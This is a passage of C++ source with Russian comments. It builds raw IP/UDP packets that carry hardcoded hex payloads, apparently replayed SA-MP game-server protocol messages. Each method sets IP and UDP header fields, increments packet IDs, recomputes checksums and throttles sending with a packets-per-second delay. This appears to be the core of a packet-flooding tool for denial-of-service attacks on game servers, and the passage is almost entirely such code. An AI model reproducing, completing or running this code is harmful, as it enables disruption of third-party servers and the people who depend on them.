	memcpy((void*)udph + sizeof(struct udphdr), "\x1c\x86\x48\xb4\x02\xd2\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00\x3a\x0c\x91\x68\x85\xaa\xc0\x14\x60\xe9\x0f\xff\xf0\x20\x00\x00\x04\x30\x20\x00\x0f\x20\x30\x00\x00\x00\x00\x00\x00\x3b\x0c\x91\x69\x05\x9e\x80\x20\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x0c\x91\x69\x85\xa4\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv28(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 88; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x5e\x86\x48\x94\x83\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\xbe\x0c\x91\x29\x86\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv29(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 159; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x78\x85\x48\xa2\xc2\x8f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\xf2\x0a\x91\x46\x05\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00\xf3\x0a\x91\x46\x85\x1e\x80\x20\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv30(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 29; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x01\x06\xb8\x56\x40\x11\x40\xd0\x00\x00\x00\x00\x03\x0d\x91\x2b\x06\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv31(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 71; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x02\x06\xc8\x95\xc3\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv32(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x02\x86\xc8\x96\x03\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv33(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 71; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x06\xc8\x96\x43\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv34(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x86\xc8\x96\x83\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv35(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x44\x28", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv36(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 545; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x4f\x87\x48\xb9\xc3\x41\xb0\x20\x14\xa4\xdf\x00\x31\x40\x19\xe0\x20\x00\x1f\x59\x13\xe8\x9e\xdc\x9f\x98\x86\x29\x6d\x48\x40\x00\x19\x88\x40\x20\x20\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa0\x0e\x91\x74\x06\x83\x60\x40\x14\xa4\xdf\x00\x31\x60\x1c\x20\x20\x00\x07\x1b\x93\xe8\x8a\x0b\x9f\xb8\x9a\x47\xcd\x48\x48\x1f\xf7\xe8\x40\xc0\xc0\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa1\x0e\x91\x74\x86\x83\x60\x40\x14\xa4\xdf\x00\x31\x80\x1f\xc0\x20\x00\x00\x3b\xd3\xe8\x8e\x18\x3f\xb8\x81\xd3\x8d\x48\x4e\x1f\xd9\x68\x40\xc0\xc0\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa2\x0e\x91\x75\x06\x83\x60\x40\x14\xa4\xdf\x00\x39\x40\x06\x00\x40\x00\x03\x85\xb4\x68\x91\xe1\x40\x18\xb5\xd4\xcd\x08\x5a\x1f\xce\x68\x7f\xe0\x20\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa3\x0e\x91\x75\x86\x83\x60\x40\x14\xa4\xdf\x00\x39\xa0\x13\x20\x20\x00\x0a\x1b\xd3\xa8\x87\x10\xff\x78\x9b\x0c\xcd\xc8\x53\x1f\xc6\x68\x60\x20\x20\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa4\x0e\x91\x76\x06\xa2\xc0\x14\xa5\xe1\x0f\xb0\x10\xa5\x0e\x91\x76\x86\x83\x60\x40\x14\xa4\xdf\x00\x27\x80\xa1\x40\x40\x00\x0c\x19\x13\xe8\x8c\x01\x7f\x78\x8a\x6d\x6d\x48\x40\x1f\xda\x68\x5f\xe0\x60\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0\xa6\x0e\x91\x77\x06\x83\x60\x40\x14\xa4\xdf\x00\x27\xa0\xba\x80\x20\x00\x18\x19\x13\xe8\x95\x07\x9f\x98\x9f\xba\xed\x48\x40\x1f\xf8\x68\x5f\xff\xe0\x00\x0f\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv37(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 534; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x00\x32\x28\x06\xbf\x74\x00\x00\x07\x00\x64\x90\x09\x4e\xac\xaf\x02\xbf\x74\x00\x00\x08\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x0c\x57\x40\x00\x00\x09\x00\x91\x00\x80\x16\x60\x40\x14\x86\xd2\x00\x41\x20\x02\x39\xb9\x89\x87\xc0\x00\x0c\x18\x3f\xff\xff\xff\xe0\x08\x04\x28\x80\x00\x1c\x28\x60\x00\x00\x1f\xe0\x20\x00\x00\x00\x1f\xe0\x80\x00\x00\x10\x17\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x07\xff\xff\xff\xff\xe1\xe0\x0d\x8d\xec\x2c\x8e\x6c\x66\x47\x4d\x8d\xec\x2c\x8e\x6c\x66\x40\x0a\x00\x91\x01\x00\x08\x60\x40\x14\x86\xc4\x00\x41\x40\x02\x29\x1c\x3f\x47\xc0\x00\x00\x07\xff\xff\xff\xff\xe0\x10\x1f\x48\x60\x00\x00\x88\x40\x00\x00\x1f\xe0\x20\x00\x00\x00\x1f\xe0\x20\x00\x10\x03\xa8\x80\x00\x1a\xc8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x07\xff\xff\xff\xff\xe0\x20\x0b\xe0\x0b\x00\x91\x01\x80\x18\xc1\x20\x14\x8b\xd4\x61\x28\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x00\xc0\x16\xf1\x20\x33\xc0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\xa9\x9d\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x98\x18\x08\x5c\x08\x10\x38\x10\x0c\x10\x9c\x05\x94\x38\x08\x0c\x90\x04\x10\x0c\x24\x10\x10\x08\x00\x04\x64\x14\x10\x00\x5c\x00\x04\x20\x1c\x10\x04\x04\x08\x00\x10\x00\x00\x00\x04\x2c\x24\x18\x18\x08\x00\x04\xc4\x0c\x00\x0c\x00\x00\x14\x04\x08\x2c\x38\x10\x38\x00\x00\x14\x0c\x34\x10\x1c\x54\x04\x04\x2c\x54\x24\x50\x10\x0c\x28\x98\x18\x04\x04\x00\x04\x4c\x08\x20\x08\x0c\x14\x10\x30\x10\x10\x14\x00\x0c\x14\x00\x18\x18\x10\x00\x50\x14\x04\x00\x20\x04\x08\x0c\x08\x0c\x10\x18\x14\x28\x54\x57\x70\x0c\x04\x04\x14\x08\x08\x08\x08\x04\x00\x10\x14\x34\x20\x00\x00\x00\x08\x8c\x0c\x10\x00\x14\x08\x20\x0c\x48\x20\x08\x04\x08\x30\x0c\x20\x14\x2c\x7d\x18\x10\x84\x08\x00\x48\x1c\x88\x18\x00\x00\x00\x00\x18\x04\x14\x20\x04\x04\x7c\x08\x18\x00\x00\x04\x00\x18\x2c\x04\x00\x00\x04\x00\x10\x00\x04\x2c\x10\x10\x04\x1c\x08\x1c\x44\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv38(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 15; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x06\x00\x48\x81\x00\x11\xe0\x14\x3c\xe2\x0a\x27\x50\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd1(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 545; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x13\x00\x48\x84\x40\x15\xe0\x14\x2b\xea\x03\xd1\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x27\x00\x91\x09\x00\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x04\x90\x00\x00\x00\x28\x00\x91\x09\x80\x24\xc0\x14\xa0\xe3\x00\x10\x05\x0c\x80\x34\x00\x29\x00\x91\x0a\x00\x28\x40\x14\x5b\xe6\x80\x0b\x0d\xb0\x84\x08\xc4\x72\xa4\x1e\x89\xdb\xc4\x10\x2a\x00\x91\x0a\x80\x23\xc0\x14\xa1\xe2\x00\x10\x00\x00\x00\x2b\x00\x91\x0b\x00\x2c\x40\x14\x0b\xea\x80\x00\x01\x14\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x40\x10\x2c\x00\x91\x0b\x80\x2f\x40\x14\x0b\xed\x80\x00\x01\x74\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x46\x66\x46\x46\x46\x66\x40\x10\x2d\x00\x91\x0c\x00\x2f\xc0\x14\x0b\xee\x00\x00\x01\x84\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x46\x46\x46\x66\x76\x66\x46\x60\x10\x2e\x00\x91\x0c\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x10\x10\x2f\x00\x91\x0d\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x20\x10\x30\x00\x91\x0d\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x30\x10\x31\x00\x91\x0e\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x40\x10\x32\x00\x91\x0e\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x50\x10\x33\x00\x91\x0f\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x60\x10\x34\x00\x91\x0f\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x70\x10\x35\x00\x91\x10\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x80\x10\x36\x00\x91\x10\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x90\x10\x37\x00\x91\x11\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x00\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 155; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1c\x00\x48\x88\xc0\x11\x60\x14\x1d\xe1\x01\x50\x00\x39\x00\x91\x12\x00\x22\x00\x14\x14\xf0\xf0\x3a\x00\x91\x12\x80\x23\xc0\x14\x23\xe2\x09\xe9\xf0\x00\x00\x3b\x00\x91\x13\x00\x22\x00\x14\x98\xf8\x08\x3c\x00\x91\x13\x80\x22\x00\x14\x5e\xf8\x06\x3d\x00\x91\x14\x00\x25\xc0\x14\x16\xe4\x01\x10\x00\x00\x04\x00\x00\x00\x00\x3e\x00\x91\x14\x80\x22\x00\x14\x58\xf8\x16\x3f\x00\x91\x15\x00\x23\xc0\x14\x12\xe2\x00\x01\xcf\x4a\xb0\x40\x00\x91\x15\x80\x24\xc0\x14\x48\xe3\x00\x00\x0f\xfd\xbe\xff\xf0\x41\x00\x91\x16\x00\x24\xc0\x14\x93\xe3\x00\x10\x00\x08\x03\xb4\x50\x42\x00\x91\x16\x80\x23\xc0\x14\x0e\xe2\x00\x00\x0c\x84\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 545; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x3f\x00\x48\x9a\x00\x15\xe0\x14\x2b\xea\x01\x50\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x7f\x00\x91\x34\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x06\x20\x00\x00\x00\x80\x00\x91\x35\x00\x24\xc0\x14\xa0\xe3\x00\x10\x01\x83\x7b\xac\x10\x81\x00\x91\x35\x80\x28\x40\x14\x5b\xe6\x80\x0e\xac\x3d\x4c\x1f\xf9\xfb\x2c\x15\x8b\x3b\x24\x10\x82\x00\x91\x36\x00\x23\xc0\x14\xa1\xe2\x00\x10\x00\x00\x00\x83\x00\x91\x36\x80\x2c\x40\x14\x0b\xea\x80\x00\x01\x14\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x40\x10\x84\x00\x91\x37\x00\x2f\x40\x14\x0b\xed\x80\x00\x01\x74\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x46\x66\x46\x46\x46\x66\x40\x10\x85\x00\x91\x37\x80\x2f\xc0\x14\x0b\xee\x00\x00\x01\x84\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x46\x46\x46\x66\x76\x66\x46\x60\x10\x86\x00\x91\x38\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x10\x10\x87\x00\x91\x38\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x20\x10\x88\x00\x91\x39\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x30\x10\x89\x00\x91\x39\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x40\x10\x8a\x00\x91\x3a\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x50\x10\x8b\x00\x91\x3a\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x60\x10\x8c\x00\x91\x3b\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x70\x10\x8d\x00\x91\x3b\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x80\x10\x8e\x00\x91\x3c\x00\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x90\x10\x8f\x00\x91\x3c\x80\x2c\xc0\x14\x0b\xeb\x00\x00\x01\x24\x86\x16\x36\xb6\x56\x44\x27\x94\x16\xc6\x57\x84\x47\x26\x96\x67\x43\x00\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
